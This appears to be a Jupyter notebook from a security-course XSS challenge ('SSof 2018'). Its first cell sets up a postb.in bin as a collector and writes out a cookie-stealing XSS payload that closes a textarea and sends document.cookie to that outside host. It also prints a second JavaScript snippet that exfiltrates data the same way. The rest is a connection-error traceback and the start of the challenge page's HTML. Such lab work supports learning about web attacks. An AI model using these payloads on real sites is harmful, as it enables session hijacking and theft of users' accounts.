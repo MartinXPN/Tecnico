{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "ename": "ConnectionError",
     "evalue": "('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mRemoteDisconnected\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/connectionpool.py\u001b[0m in \u001b[0;36murlopen\u001b[0;34m(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, **response_kw)\u001b[0m\n\u001b[1;32m    669\u001b[0m             \u001b[0;31m# Make the request on the httplib connection object.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 670\u001b[0;31m             httplib_response = self._make_request(\n\u001b[0m\u001b[1;32m    671\u001b[0m                 \u001b[0mconn\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/connectionpool.py\u001b[0m in \u001b[0;36m_make_request\u001b[0;34m(self, conn, method, url, timeout, chunked, **httplib_request_kw)\u001b[0m\n\u001b[1;32m    425\u001b[0m                     \u001b[0;31m# Otherwise it looks like a bug in the code.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 426\u001b[0;31m                     \u001b[0msix\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_from\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0me\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    427\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0mSocketTimeout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mBaseSSLError\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mSocketError\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/packages/six.py\u001b[0m in \u001b[0;36mraise_from\u001b[0;34m(value, from_value)\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/connectionpool.py\u001b[0m in \u001b[0;36m_make_request\u001b[0;34m(self, conn, method, url, timeout, chunked, **httplib_request_kw)\u001b[0m\n\u001b[1;32m    420\u001b[0m                 \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 421\u001b[0;31m                     \u001b[0mhttplib_response\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mconn\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgetresponse\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    422\u001b[0m                 \u001b[0;32mexcept\u001b[0m \u001b[0mBaseException\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.8/3.8.6/Frameworks/Python.framework/Versions/3.8/lib/python3.8/http/client.py\u001b[0m in \u001b[0;36mgetresponse\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m   1346\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1347\u001b[0;31m                 \u001b[0mresponse\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbegin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1348\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mConnectionError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.8/3.8.6/Frameworks/Python.framework/Versions/3.8/lib/python3.8/http/client.py\u001b[0m in \u001b[0;36mbegin\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    306\u001b[0m         \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 307\u001b[0;31m             \u001b[0mversion\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstatus\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mreason\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_read_status\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    308\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mstatus\u001b[0m \u001b[0;34m!=\u001b[0m \u001b[0mCONTINUE\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.8/3.8.6/Frameworks/Python.framework/Versions/3.8/lib/python3.8/http/client.py\u001b[0m in \u001b[0;36m_read_status\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    275\u001b[0m             \u001b[0;31m# sending a valid response.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 276\u001b[0;31m             raise RemoteDisconnected(\"Remote end closed connection without\"\n\u001b[0m\u001b[1;32m    277\u001b[0m                                      \" response\")\n",
      "\u001b[0;31mRemoteDisconnected\u001b[0m: Remote end closed connection without response",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mProtocolError\u001b[0m                             Traceback (most recent call last)",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/requests/adapters.py\u001b[0m in \u001b[0;36msend\u001b[0;34m(self, request, stream, timeout, verify, cert, proxies)\u001b[0m\n\u001b[1;32m    438\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mchunked\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 439\u001b[0;31m                 resp = conn.urlopen(\n\u001b[0m\u001b[1;32m    440\u001b[0m                     \u001b[0mmethod\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mrequest\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmethod\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/connectionpool.py\u001b[0m in \u001b[0;36murlopen\u001b[0;34m(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, **response_kw)\u001b[0m\n\u001b[1;32m    725\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 726\u001b[0;31m             retries = retries.increment(\n\u001b[0m\u001b[1;32m    727\u001b[0m                 \u001b[0mmethod\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0murl\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0merror\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0me\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0m_pool\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0m_stacktrace\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexc_info\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m2\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/util/retry.py\u001b[0m in \u001b[0;36mincrement\u001b[0;34m(self, method, url, response, error, _pool, _stacktrace)\u001b[0m\n\u001b[1;32m    402\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mread\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mFalse\u001b[0m \u001b[0;32mor\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_is_method_retryable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmethod\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 403\u001b[0;31m                 \u001b[0;32mraise\u001b[0m \u001b[0msix\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreraise\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtype\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0merror\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0merror\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0m_stacktrace\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    404\u001b[0m             \u001b[0;32melif\u001b[0m \u001b[0mread\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/packages/six.py\u001b[0m in \u001b[0;36mreraise\u001b[0;34m(tp, value, tb)\u001b[0m\n\u001b[1;32m    733\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m__traceback__\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 734\u001b[0;31m                 \u001b[0;32mraise\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mwith_traceback\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtb\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    735\u001b[0m             \u001b[0;32mraise\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/connectionpool.py\u001b[0m in \u001b[0;36murlopen\u001b[0;34m(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, **response_kw)\u001b[0m\n\u001b[1;32m    669\u001b[0m             \u001b[0;31m# Make the request on the httplib connection object.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 670\u001b[0;31m             httplib_response = self._make_request(\n\u001b[0m\u001b[1;32m    671\u001b[0m                 \u001b[0mconn\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/connectionpool.py\u001b[0m in \u001b[0;36m_make_request\u001b[0;34m(self, conn, method, url, timeout, chunked, **httplib_request_kw)\u001b[0m\n\u001b[1;32m    425\u001b[0m                     \u001b[0;31m# Otherwise it looks like a bug in the code.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 426\u001b[0;31m                     \u001b[0msix\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_from\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0me\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    427\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0mSocketTimeout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mBaseSSLError\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mSocketError\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/packages/six.py\u001b[0m in \u001b[0;36mraise_from\u001b[0;34m(value, from_value)\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/urllib3/connectionpool.py\u001b[0m in \u001b[0;36m_make_request\u001b[0;34m(self, conn, method, url, timeout, chunked, **httplib_request_kw)\u001b[0m\n\u001b[1;32m    420\u001b[0m                 \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 421\u001b[0;31m                     \u001b[0mhttplib_response\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mconn\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgetresponse\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    422\u001b[0m                 \u001b[0;32mexcept\u001b[0m \u001b[0mBaseException\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.8/3.8.6/Frameworks/Python.framework/Versions/3.8/lib/python3.8/http/client.py\u001b[0m in \u001b[0;36mgetresponse\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m   1346\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1347\u001b[0;31m                 \u001b[0mresponse\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbegin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1348\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mConnectionError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.8/3.8.6/Frameworks/Python.framework/Versions/3.8/lib/python3.8/http/client.py\u001b[0m in \u001b[0;36mbegin\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    306\u001b[0m         \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 307\u001b[0;31m             \u001b[0mversion\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstatus\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mreason\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_read_status\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    308\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mstatus\u001b[0m \u001b[0;34m!=\u001b[0m \u001b[0mCONTINUE\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.8/3.8.6/Frameworks/Python.framework/Versions/3.8/lib/python3.8/http/client.py\u001b[0m in \u001b[0;36m_read_status\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    275\u001b[0m             \u001b[0;31m# sending a valid response.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 276\u001b[0;31m             raise RemoteDisconnected(\"Remote end closed connection without\"\n\u001b[0m\u001b[1;32m    277\u001b[0m                                      \" response\")\n",
      "\u001b[0;31mProtocolError\u001b[0m: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mConnectionError\u001b[0m                           Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-2-fc0d4faeb665>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m \u001b[0mr\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mrequests\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mpost\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'https://postb.in/api/bin'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m \u001b[0mbin_id\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjson\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'binId'\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf'Access stolen data at: https://postb.in/b/{bin_id}'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/requests/api.py\u001b[0m in \u001b[0;36mpost\u001b[0;34m(url, data, json, **kwargs)\u001b[0m\n\u001b[1;32m    117\u001b[0m     \"\"\"\n\u001b[1;32m    118\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 119\u001b[0;31m     \u001b[0;32mreturn\u001b[0m \u001b[0mrequest\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'post'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0murl\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdata\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mdata\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mjson\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mjson\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    120\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    121\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/requests/api.py\u001b[0m in \u001b[0;36mrequest\u001b[0;34m(method, url, **kwargs)\u001b[0m\n\u001b[1;32m     59\u001b[0m     \u001b[0;31m# cases, and look like a memory leak in others.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     60\u001b[0m     \u001b[0;32mwith\u001b[0m \u001b[0msessions\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mSession\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0msession\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 61\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0msession\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrequest\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmethod\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mmethod\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0murl\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0murl\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     62\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     63\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/requests/sessions.py\u001b[0m in \u001b[0;36mrequest\u001b[0;34m(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)\u001b[0m\n\u001b[1;32m    528\u001b[0m         }\n\u001b[1;32m    529\u001b[0m         \u001b[0msend_kwargs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mupdate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0msettings\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 530\u001b[0;31m         \u001b[0mresp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprep\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0msend_kwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    531\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    532\u001b[0m         \u001b[0;32mreturn\u001b[0m \u001b[0mresp\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/requests/sessions.py\u001b[0m in \u001b[0;36msend\u001b[0;34m(self, request, **kwargs)\u001b[0m\n\u001b[1;32m    641\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    642\u001b[0m         \u001b[0;31m# Send the request\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 643\u001b[0;31m         \u001b[0mr\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0madapter\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrequest\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    644\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    645\u001b[0m         \u001b[0;31m# Total elapsed time of the request (approximately)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.8/site-packages/requests/adapters.py\u001b[0m in \u001b[0;36msend\u001b[0;34m(self, request, stream, timeout, verify, cert, proxies)\u001b[0m\n\u001b[1;32m    496\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    497\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0mProtocolError\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msocket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0merror\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0merr\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 498\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mConnectionError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrequest\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mrequest\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    499\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    500\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mMaxRetryError\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mConnectionError\u001b[0m: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "\n",
    "r = requests.post('https://postb.in/api/bin')\n",
    "bin_id = r.json()['binId']\n",
    "print(f'Access stolen data at: https://postb.in/b/{bin_id}')\n",
    "\n",
    "target_url = f'https://postb.in/{bin_id}'\n",
    "\n",
    "# close_all_html_tags = '</a></abbr></acronym></address></applet></area></article></aside></audio></b></base></basefont></bdi></bdo></big></blockquote></br></button></canvas></caption></center></cite></code></col></colgroup></data></datalist></dd></del></details></dfn></dialog></dir></div></dl></dt></em></embed></fieldset></figcaption></figure></font></footer></form></frame></frameset></h1></h2></h3></h4></h5></h6></head></header></hr></i></iframe></img></input></ins></kbd></label></legend></li></link></main></map></mark></meta></meter></nav></noframes></noscript></object></ol></optgroup></option></output></p></param></picture></pre></progress></q></rp></rt></ruby></s></samp></section></select></small></source></span></strike></strong></style></sub></summary></sup></svg></table></tbody></td></template></textarea></tfoot></th></thead></time></title></tr></track></tt></u></ul></var></video></wbr>'\n",
    "# close_all_html_tags *= 50\n",
    "\n",
    "\n",
    "steal_cookies = f'''\n",
    "</textarea>\n",
    "<script>\n",
    "var xhr = new XMLHttpRequest();\n",
    "xhr.open(\"GET\", \"{target_url}/?cookie=\"+document.cookie, false);\n",
    "xhr.send();\n",
    "</script>\n",
    "<textarea>'''\n",
    "print(steal_cookies)\n",
    "\n",
    "print('------------------------------')\n",
    "print(f'''\n",
    "var A = A || (function(){{\n",
    "    var _args = {{}}; // private\n",
    "\n",
    "    return {{\n",
    "        i : function(Args) {{\n",
    "            _args = Args;\n",
    "        }},\n",
    "        s : function() {{\n",
    "            var xhr = new XMLHttpRequest();\n",
    "            xhr.open(\"GET\", \"{target_url}/?cookie=\"+args, false);\n",
    "\t\t\txhr.send();\n",
    "        }}\n",
    "    }};\n",
    "}}());\n",
    "''')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "115\n",
      "<!doctype html>\n",
      "<title>Blog Post - SSof 2018</title>\n",
      "<link rel=\"stylesheet\" href=\"/static/bootstrap.min.css\">\n",
      "<nav class=\"navbar navbar-expand-lg navbar-dark bg-primary\">\n",
      "    <a class=\"navbar-brand\">SSof 2018 - XSS challenges</a>\n",
      "</nav>\n",
      "\n",
      "\n",
      "<div class=\"container-fluid\">\n",
      "    <div class=\"row\">\n",
      "        <div class=\"col-3\">\n",
      "        </div>\n",
      "        <div class=\"col-6 bg-secondary\">\n",
      "            <!-- BlogPost column -->\n",
      "            <form class=\"mb-3\" action=\"/submit_post_for_review\" method=\"post\">\n",
      "                <fieldset>\n",
